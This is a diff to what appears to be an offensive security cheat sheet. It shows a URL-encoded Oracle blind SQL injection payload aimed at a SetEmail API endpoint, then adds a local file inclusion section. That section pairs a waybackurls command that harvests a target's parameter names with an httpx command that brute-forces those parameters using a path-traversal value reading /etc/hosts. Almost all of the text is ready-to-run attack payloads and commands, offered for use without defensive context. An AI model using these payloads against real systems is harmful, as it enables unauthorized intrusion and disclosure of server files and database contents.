@@ -267,3 +267,14 @@ POST /api/v3/SetEmail
 ```
 EHY01%27OR+1%3d1+AND+NVL(ASCII(SUBSTR((SELECT+chr(78)%7c%7cchr(69)%7c%7cchr(84)%7c%7cchr(83)%7c%7cchr(80) )%7c%7cchr(65)%7c%7cchr(82)%7c%7cchr(75)%7c%7cchr(69)%7c%7cchr(82)+FROM+DUAL)%2c9%2c1))%2c0) %3d82--
 ```
+# LFI
+LFI exploitation tool
+
+1.Gather Parameters from wayback
+```
+waybackurls target | grep -Eo '\b[^=&?]+\=[^&?]+' | awk -F= '{print $1}' | sort -u
+```
+2.Bruteforce LFI
+```
+xargs -I{} httpx -silent -path "?{}=/../../../../../../../../etc/hosts" -u target
+```
